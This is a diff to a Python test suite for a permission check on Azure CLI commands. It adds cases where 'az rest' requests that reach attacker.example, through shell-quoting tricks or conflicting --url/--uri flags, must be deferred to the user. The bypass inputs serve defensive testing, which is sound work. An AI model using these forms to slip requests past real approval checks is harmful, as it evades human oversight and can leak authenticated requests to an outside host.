@@ -82,6 +82,8 @@ def test_az_read_only_allowed(client, base_event, command):
         # Shell syntax the shell removes: these reach az as //attacker.example
         'az rest --method get --url /""/attacker.example/x',
         "az rest --method get --url /$EMPTY/attacker.example/x",
+        # With both --url and --uri the later one wins, so neither is trusted
+        "az rest --url https://management.azure.com/ --uri https://attacker.example --method GET",
     ],
 )
 def test_az_rest_get_outside_azure_defers_to_user(client, base_event, command):
